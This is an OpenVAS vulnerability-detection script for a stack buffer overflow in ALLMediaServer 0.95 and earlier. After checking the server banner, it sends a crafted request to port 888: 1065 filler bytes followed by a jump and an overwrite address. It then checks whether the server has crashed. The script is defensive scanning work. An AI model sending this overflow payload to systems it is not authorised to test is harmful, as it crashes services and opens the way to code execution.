##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_allmediaserver_stack_bof_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# ALLMediaServer Request Handling Stack Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803745");
  script_version("$Revision: 11401 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-08-22 10:39:02 +0530 (Thu, 22 Aug 2013)");
  script_name("ALLMediaServer Request Handling Stack Buffer Overflow Vulnerability");

  script_tag(name:"summary", value:"The host is running ALLMediaServer and is prone to stack based buffer overflow
  vulnerability.");
  script_tag(name:"vuldetect", value:"Send the crafted HTTP GET request and check the server crashed or not.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"insight", value:"The flaw is due to a boundary error when processing certain network requests
  and can be exploited to cause a stack based buffer overflow via a specially
  crafted packet sent to TCP port 888.");
  script_tag(name:"affected", value:"ALLMediaServer version 0.95 and prior.");
  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary code in
  the context of the application. Failed attacks will cause denial of service conditions.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122912");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122913");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/allmediaserver-095-buffer-overflow");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 888);
  script_mandatory_keys("ALLPLAYER-DLNA/banner");

  exit(0);
}


include("http_func.inc");

port = get_http_port(default:888);

if(http_is_dead(port:port)){
  exit(0);
}

## Open HTTP Socket
soc = http_open_socket(port);
if(!soc) {
  exit(0);
}

banner = get_http_banner(port: port);
if("Server: ALLPLAYER-DLNA" >!< banner)
{
  http_close_socket(soc);
  exit(0);
}

req = crap(data: "A", length: 1065) + "\xEB\x06\xFF\xFF" + "\x54\x08\x6f\x00";

send(socket:soc, data:req);
http_close_socket(soc);

sleep(3);

if(http_is_dead(port:port))
{
  security_message(port:port);
  exit(0);
}

exit(99);
